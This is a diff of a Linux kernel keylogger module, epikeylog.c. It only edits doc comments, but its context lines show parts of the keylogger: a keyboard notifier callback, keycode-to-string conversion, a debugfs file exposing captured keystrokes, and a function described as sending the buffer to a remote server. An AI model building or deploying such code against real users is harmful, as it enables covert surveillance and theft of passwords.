@@ -158,14 +158,6 @@ static struct keylog_buffer keylog_buf = {
     .buf = NULL,
 };
 
-/**
- * File read handler for debugfs file.
- * @param file Pointer to the file structure.
- * @param user_buf Buffer to copy data to user space.
- * @param count Number of bytes to read.
- * @param ppos Pointer to the file offset.
- * @return Number of bytes read on success, negative error code on failure.
- */
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len,
                          loff_t *offset) {
     return simple_read_from_buffer(buffer, len, offset, keylog_buf.buf,
@@ -177,12 +169,6 @@ const struct file_operations keys_fops = {
     .read = keys_read,
 };
 
-/**
- * Converts a keycode and shift state to a readable key string.
- * @param keycode The keycode to convert.
- * @param shift_state Non-zero if the shift key is pressed, zero otherwise.
- * @return A pointer to a string representing the key.
- */
 static void keycode_to_string(int keycode, int shift_mask, char *buf) {
     if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
         const char *key = shift_mask ? keymap[keycode][1] : keymap[keycode][0];
@@ -190,13 +176,6 @@ static void keycode_to_string(int keycode, int shift_mask, char *buf) {
     }
 }
 
-/**
- * Keyboard notifier callback function.
- * @param notifier_block Pointer to the notifier block structure.
- * @param action         The action/event type (e.g., key press, key release).
- * @param data           Pointer to event-specific data.
- * @return               NOTIFY_OK or appropriate notifier return value.
- */
 static int epikeylog_callback(struct notifier_block *nblock, unsigned long code,
                               void *_param) {
     size_t len;
@@ -237,7 +216,6 @@ static struct notifier_block epikeylog_blk = {
 };
 
 /**
- * @file epikeylog.c
  * @brief Handles sending the keylogger buffer content to the remote server.
  */
 int epikeylog_send_to_server(void) {
@@ -272,7 +250,7 @@ int epikeylog_send_to_server(void) {
 }
 
 /**
- * Prepares the debugfs structures for the keylogger.
+ * @brief Prepares the debugfs structures for the keylogger.
  * @return 0 on success, negative error code on failure.
  */
 static int prepare_dbgfs(void) {
@@ -302,7 +280,7 @@ static int prepare_dbgfs(void) {
 }
 
 /**
- * Cleans up the debugfs structures.
+ * @brief Cleans up the debugfs structures.
  */
 static void clean_dbgfs(void) {
     if (file) {
@@ -317,7 +295,7 @@ static void clean_dbgfs(void) {
 }
 
 /**
- * Initializes the keylogger module.
+ * @brief Initializes the keylogger module.
  * @return 0 on success, negative error code on failure.
  */
 int epikeylog_init() {
@@ -355,7 +333,7 @@ int epikeylog_init() {
 }
 
 /**
- * Exits the keylogger module, unregisters the notifier, and cleans up.
+ * @brief Exits the keylogger module, unregisters the notifier, and cleans up.
  * @return 0 on success, negative error code on failure.
  */
 int epikeylog_exit(void) {
